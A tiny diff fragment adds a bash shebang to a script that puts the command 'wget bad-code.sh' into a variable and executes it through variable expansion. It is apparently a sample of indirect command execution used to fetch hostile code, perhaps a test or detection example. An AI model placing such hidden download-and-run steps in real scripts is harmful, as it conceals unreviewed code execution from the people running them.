@@ -1,3 +1,4 @@
+#!/bin/bash
 
 var="wget bad-code.sh"
 $var
